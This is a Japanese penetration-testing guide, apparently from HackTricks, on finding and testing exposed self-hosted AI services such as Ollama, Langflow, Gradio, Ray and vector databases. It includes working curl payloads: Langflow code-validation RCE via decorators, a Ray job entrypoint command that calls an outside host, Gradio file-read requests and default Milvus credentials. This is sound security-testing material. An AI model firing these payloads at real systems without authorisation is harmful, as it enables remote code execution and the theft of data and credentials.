# 公開されたセルフホスト型AIサービス

{{#include ../banners/hacktricks-training.md}}

AI機能を構築するチームは、自前のmodel runner、agent builder、デモUI、compute cluster、vector databaseを稼働させることがよくあります。これらのツールの多くは、ノートPCや閉じたラボネットワーク向けに設計されているため、**デフォルトで認証がない**か、認証を省略する設定が有効になっています。攻撃者がこうしたサービスにアクセスできる場合、通常、影響は次のいずれかに該当します。

- GPUやモデルを無料で利用され、非公開モデルを窃取される。
- プロンプト、ドキュメント、embeddingが漏えいする。
- プロセス環境変数に含まれるsecret（LLM provider key、cloud credential）が漏えいする。
- これらのAPIの一部は**機能として**コードを実行するため、コード実行につながる。

このページでは、こうしたサービスの見つけ方と、各種APIでテストすべき項目を説明します。セルフホスト型inference serverのhardeningとllama.cppの`/slots` leakについては、[AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening)を参照してください。悪意のあるmodel fileについては、[AI Models RCE](AI-Models-RCE.md)を参照してください。

## Fingerprinting

認証情報なしで、これらのリクエストを送信します。期待されるフィールドを含むJSON応答があれば、製品を特定でき、多くの場合はバージョンも判明するため、以下のどのチェックを適用するか判断できます。ポートは、ドキュメントに記載されたデフォルト値、または公式の実行例で使われているポートです。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| 製品 | 一般的なポート | 認証なしでのリクエスト | 識別できる情報 |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`、`GET /api/tags` | バージョンJSON、ローカルモデルの一覧 |
| Langflow | 7860 | `GET /api/v1/version` | LangflowのバージョンJSON |
| Gradio | 7860 | `GET /config` | Gradioのバージョンとcomponent IDを含むアプリ設定 |
| Ray dashboard | 8265 | `GET /api/version`、`GET /api/jobs/` | `ray_version`、送信済みジョブの一覧 |
| Chroma | 8000 | `GET /api/v2/heartbeat`、`GET /api/v2/version` | heartbeat値、Chromaのバージョン |
| Qdrant | 6333 | `GET /`、`GET /collections` | Qdrantのバージョン、collection一覧 |
| Weaviate | - | `GET /v1/meta`、`GET /v1/schema` | Weaviateのバージョン、class |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | collection一覧、または認証エラー |

これらのサービスは、reverse proxyのパスprefix（例：`/ollama/`や`/ray/`）の背後で公開されていることもよくあります。そのため、JavaScript bundleやAPIドキュメントで見つかったprefixを付けて、リクエストを繰り返してください。

## 認証なしのinference APIとmodel-management API

Model runnerは通常、inference routeと管理用routeを混在させた単一のREST APIを公開します。Ollamaはその好例です。組み込みの認証機能はなく、デフォルトでは`127.0.0.1:11434`にbindしますが、`OLLAMA_HOST`でbind addressを変更できます。<sup>[[1]](#references)[[15]](#references)</sup> 公式Docker imageは、コンテナ内で`OLLAMA_HOST=0.0.0.0:11434`を設定し、`EXPOSE 11434`を宣言しています。また、`USER`命令がないため、serverはコンテナ内でrootとして実行されます。<sup>[[16]](#references)</sup> `EXPOSE`はホスト上でポートを公開しないため、ホストから到達できるかどうかはdeploymentによって異なります。ドキュメントに記載された`docker run`コマンドでは`-p 11434:11434`を使っており、ホストIPを指定しない場合、Dockerはこのようなport mappingをホストのすべてのinterfaceで公開します。<sup>[[17]](#references)[[18]](#references)</sup>

各route群から攻撃者が得られるもの：<sup>[[2]](#references)</sup>

| Routes | 認証がない場合の影響 |
| --- | --- |
| `GET /api/tags`、`GET /api/ps` | 非公開のcustom modelを含む、ローカルモデルとロード済みモデルの一覧 |
| `POST /api/show` | Modelfile、template、**system prompt**を含むモデルの詳細 |
| `POST /api/generate`、`/api/chat`、`/api/embed` | 被害者のhardware上でのinferenceを無料で利用 |
| `POST /api/pull`、`/api/push` | 攻撃者が指定したregistryからserverにmodelをdownloadさせる、またはmodelをuploadさせる |
| `POST /api/create`、`/api/copy`、`DELETE /api/delete` | modelの作成、上書き、削除 |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

認証情報なしで返されるモデル一覧だけで、すでに露出が確認できます。カスタムモデルには、内部の system prompt が `/api/show` に含まれていることがよくあります。hostへのpullが成功すれば、サーバーが攻撃者の指定したregistryからmanifestを取得することが確認できます。registryへの`/api/push`によって、露出はモデル窃取につながります。実際のターゲットでは、createまたはdeleteのrouteを呼び出さないでください。

Registry pullは、サーバーがリモートmanifestの値を使ってblobを保存するため、parser攻撃の対象にもなります。Probllama（CVE-2024-37032、Ollama 0.1.34で修正）では、manifestの`digest`が検証されずにファイル名として使われていました。そのため、悪意あるregistryは`../`の並びを使って、blobsディレクトリ外にファイルを書き込めました。digestがローカルファイルを指すように細工したmanifestをpushすると、そのファイルが攻撃者のregistryにleakしました。Wizは、サーバーがrootで実行されるDockerで、共有ライブラリを書き込み、`/etc/ld.so.preload`に追加してから`/api/chat`を呼び出し、新しいプロセスにそのライブラリを読み込ませることでRCEに到達しました。<sup>[[15]](#references)</sup> runnerが任意のregistryからpullできる場合、manifestのフィールドがどのようにパスへ変換されるかを確認してください。

## 設計上コードを実行するAPI

### Job submission API

分散コンピュートframeworkでは、コード実行が主な機能です。ダッシュボードのport（8265）にあるRay Jobs APIは、`entrypoint`のshell commandを受け付け、cluster上で実行します。<sup>[[19]](#references)</sup> Oligo ShadowRayの調査によると、Jobs APIにはauthorizationがなく、ダッシュボードは`0.0.0.0`にbindします。対応するCVE-2023-48022については、Rayが制御されたネットワーク内だけでの実行を想定しているため、異論があります。<sup>[[20]](#references)</sup> Ray 2.52.0で、任意のtoken authentication（`RAY_AUTH_MODE=token`）が追加されました。Ray 2.59では、`ray.init()`で起動したローカルclusterでデフォルト有効になります。一方、利用可能なtokenがない状態でも、`ray start --head`は引き続き認証なしで起動できる場合があります。Rayは、デフォルト認証を2.61でさらに広く適用する予定であると説明しています。そのため、ダッシュボードが公開されていると決めつけず、デプロイ済みのversionと起動方式を確認してください。<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

この種のダッシュボードには、古いバージョンで調査する価値のある補助ルートもあります。Ray 2.8.1 より前では、`/log_proxy?url=` は任意の HTTP(S) URL を取得し（cloud metadata への SSRF）、`/api/v0/logs/file` は任意の `filename` パスを受け入れていました。どちらも認証は不要でした。<sup>[[8]](#references)</sup>

### 関数定義を実行するコード「検証」エンドポイント

カスタム Python コンポーネントを受け入れる Agent builder の中には、コードを `ast` で解析し、関数定義だけを `exec()` で実行してコードを「検証」するものがあります。これは安全ではありません。Python は関数を定義するときに**デコレーターとデフォルト引数の値を評価する**ため、関数本体が実行されなくても、そこに配置したコードは実行されます。Langflow の `POST /api/v1/validate/code` はこのように動作し、1.3.0 より前は認証されていませんでした（CVE-2025-3248）。コマンド出力を含む例外を発生させると、エンドポイントはレスポンスで出力を返します。<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

ユーザーコードをコンパイル、lint、または「チェック」する endpoint では、このパターンをテストし、証明には DNS callback を優先してください。

### 自動ログインとデフォルトの superuser token ルート

シングルユーザー向けツールには、すべての訪問者を administrator としてログインさせるショートカットが組み込まれていることがよくあります。Langflow では、`AUTO_LOGIN` が有効な場合、`GET /api/v1/auto_login` は、すべての呼び出し元にデフォルトの superuser の token を返します。無効な場合、このルートは `Auto login is disabled.` を返します。<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 から 1.10.0 では、デフォルトで有効になっていました（CVE-2026-9103）。これを前述の認証が必要な code-validation ルートと連鎖させると、認証なしの RCE が再び可能になります（CVE-2026-9198、Harish Kolla による報告）。<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> 現在の公式リリースパッケージと Docker イメージでは、自動ログインは無効化され、superuser password が必須ですが、開発ブランチでは有効なままです。<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

コード実行ができなくても、superuser tokenがあれば、すべてのflowと保存済みのprovider credentialsにアクセスできます。自動テストで関連する前提条件を確認する方法については、[Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md)を参照してください。

## MLデモUIのファイル配信ルートとRPCルート

MLデモフレームワークは、汎用ルートを通じてアップロード済みファイルや生成ファイルを配信し、フロントエンドからサーバー側のコンポーネントヘルパーを呼び出せるようにしています。Gradioでは、`/config`、`/upload`、`/file=<path>`が公開されています。<sup>[[5]](#references)</sup> 同様のフレームワークでは、次の2つのパターンをテストするとよいでしょう。

- **アップロード先のサブディレクトリからのパストラバーサル:** ファイルルートがパスの先頭が一時フォルダ内であることしか確認しない場合、ファイルをアップロードしてサブディレクトリを作成し、`../`または`%2e%2e%2f`でその外へ移動します。Gradio 4.0から4.10（CVE-2023-51449）には、この方法で悪用できる脆弱性がありました。<sup>[[26]](#references)[[27]](#references)</sup> クライアントがパスを正規化しないよう、`curl --path-as-is`を使ってリクエストを送信してください。
- **任意のメソッドディスパッチ:** ユーザー入力を使って`getattr(component, fn_name)`を呼び出すエンドポイントがあると、攻撃者は内部ヘルパーを呼び出せます。4.13.0より前のGradioでは、`/component_server`がこの処理を行っていました。4.3から4.12では、`move_resource_to_block_cache`が任意のローカルファイルをキャッシュにコピーし、`/file=`からダウンロードできました。3.47から3.50.2では、別のヘルパーによってファイル読み取りと全件読み取り可能なSSRFが可能でした。<sup>[[26]](#references)[[28]](#references)</sup> 修正済みのサーバーでは、サーバー関数としてマークされていないヘルパーに対して`Function not found.`と応答します。<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Hugging Face Spacesでは、Space secretsは環境変数であるため、`/proc/self/environ`が最も価値の高いファイルです。Horizon3はHTTP `Range`ヘッダーを使ってこれを読み取りました。<sup>[[26]](#references)</sup>

## RAGで使用されるvector database

RAGは、元のドキュメントのチャンク、そのembeddings、メタデータをvector databaseに保存し、assistantは上位の検索結果をpromptに含めます。そのため、読み取りアクセスがあると、非公開ドキュメントの**平文がleak**します。書き込みアクセスがあると、攻撃者は他のユーザーのpromptに後から取得されるチャンクを挿入できます。これは永続的な間接的prompt injectionです（[AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)を参照）。

self-hosted vector databaseでは、認証が設定されているか、匿名アクセスが有効になっているかを確認してください。

- **Qdrant**: self-deployed instanceは、認証なしで全インターフェースをリッスンします。設定されている場合、キーは`api-key`ヘッダーまたは`Authorization: Bearer`に指定します。読み取り専用キーやコレクション単位のキーを設定できる場合があります。<sup>[[11]](#references)</sup>
- **Chroma**: 認証はデフォルトで無効です。Token認証では`Authorization`または`X-Chroma-Token`を使用します。<sup>[[29]](#references)</sup>
- **Weaviate**: 匿名アクセスが有効な場合、認証情報なしのリクエストは`user: anonymous`として認証され、そのユーザーに付与された権限を取得します。<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled`が`true`でない限り、認証は無効です。有効な場合、デフォルトの`root`ユーザーのパスワードは`Milvus`で、tokenの形式は`username:password`です。<sup>[[31]](#references)[[14]](#references)</sup>

認証情報なしで非公開データを含むレスポンスが返る場合、情報が露出しています。認証が有効な場合は、変更されていないデフォルトアカウントも別途評価してください。<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

payloadsにドキュメントのテキスト、ユーザー識別子、テナント名が含まれていないか確認してください。本番データを汚染せずに書き込み権限を示すには、明確に名前を付けた空のcollectionを作成してすぐに削除します。ただし、scopeで許可されている場合に限ります。

これらのサーバーでは、認証が間に合わないこともあります。ChromaのPython FastAPIサーバー（1.0.0から少なくとも1.5.8まで、CVE-2026-45829）では、collection作成ルートが認証チェックの前に、クライアント指定のembedding functionを構築していました。`trust_remote_code: true`を指定し、攻撃者が制御するHugging Faceモデルを参照する設定では、リクエストが拒否されても攻撃者のコードが実行されました。Rust frontendには影響しませんでした。<sup>[[32]](#references)</sup> リクエストにモデルまたはpluginの設定が含まれる場合は、認証情報なしでテストし、モデルリポジトリへのアウトバウンドfetchを監視してください。

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama APIドキュメント](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflowソース - API v1エンドポイント](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradioソース - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradioソース - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Rayソース - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Rayバージョン2.6.3、2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chromaソース - Pythonクライアントのデフォルト設定](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chromaソース - FastAPIサーバールート](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - セキュリティ](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI仕様](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI仕様](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvusサーバーへの接続](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollamaのリモートコード実行脆弱性（CVE-2024-37032）](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Dockerドキュメント](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - ポートの公開と外部への開放](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AIワークロードを標的とし、実環境で悪用された初の既知の攻撃キャンペーン](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token認証](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - どんな速度でも危険: Python Execを悪用したLangflow AIの未認証RCE](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflowソース - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Gradioのファイル読み取り脆弱性を悪用し、Hugging Face Spacesからシークレットを窃取](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradioアドバイザリ GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradioの`/component_server`修正コミット](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chromaネイティブ認証](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - 認証](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - ユーザーアクセスの認証](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast: 認証前に提供](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBMセキュリティ速報 - 自動ログインのバイパスとコード検証による未認証リモートコード実行（CVE-2026-9198）](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
